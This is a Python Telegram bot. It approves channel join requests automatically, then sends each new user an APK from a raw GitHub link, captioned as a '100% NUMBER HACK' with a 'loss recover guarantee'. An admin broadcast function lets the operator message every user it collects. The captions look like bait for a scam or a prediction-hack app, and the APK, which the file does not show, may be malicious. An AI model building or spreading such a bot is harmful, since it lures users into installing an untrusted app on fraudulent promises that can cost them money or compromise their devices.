import os
from telegram import Update
from telegram.ext import (
    ApplicationBuilder,
    ChatJoinRequestHandler,
    MessageHandler,
    ContextTypes,
    filters,
)

BOT_TOKEN = os.getenv("BOT_TOKEN")
ADMIN_ID = int(os.getenv("ADMIN_ID"))

users = set()

APK_CAPTION = """
✅ 100% NUMBER HACK 💥

( ONLY FOR PREMIUM USERS ⚡️ )
( 100% LOSS RECOVER GUARANTEE ⚡️ )

𝐇𝐎𝐖 𝐓𝐎 𝐔𝐒𝐄 𝐇𝐀𝐂𝐊 :- https://t.me/HOW_TO_USE_JAMES_HACK/6

FOR HELP @M4JAMES_HACK_MANAGER
"""

# 🔥 RAW APK LINK
APK_LINK = "https://raw.githubusercontent.com/loda26616-a11y/JAMES-/1db4bc6a4a7b78311162a7c798e49147eaa4a3e7/JAMES%20INJECTION%20HACK_1.0_0%20(1).apk"


# ✅ Join Request Auto Approve
async def approve_request(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        user = update.chat_join_request.from_user
        chat_id = update.chat_join_request.chat.id

        # approve request
        await context.bot.approve_chat_join_request(chat_id, user.id)

        users.add(user.id)

        # welcome message
        await context.bot.send_message(
            chat_id=user.id,
            text="✨ WELCOME TO JAMES PREMIUM BOT ✨\n\nAccess Granted 🚀"
        )

        # ✅ Send APK via RAW LINK
        await context.bot.send_document(
            chat_id=user.id,
            document=APK_LINK,
            caption=APK_CAPTION
        )

    except Exception as e:
        print(f"Error in approve_request: {e}")


# ✅ Broadcast (only admin)
async def broadcast(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        if update.effective_user.id != ADMIN_ID:
            return

        for user_id in users:
            try:
                await context.bot.copy_message(
                    chat_id=user_id,
                    from_chat_id=update.effective_chat.id,
                    message_id=update.message.id
                )
            except Exception as e:
                print(f"Broadcast error: {e}")

    except Exception as e:
        print(f"Broadcast main error: {e}")


def main():
    app = ApplicationBuilder().token(BOT_TOKEN).build()

    app.add_handler(ChatJoinRequestHandler(approve_request))
    app.add_handler(MessageHandler(filters.ALL, broadcast))

    print("✅ Bot Started...")

    # 🔥 FIXED POLLING (conflict avoid)
    app.run_polling(drop_pending_updates=True)


if __name__ == "__main__":
    main()
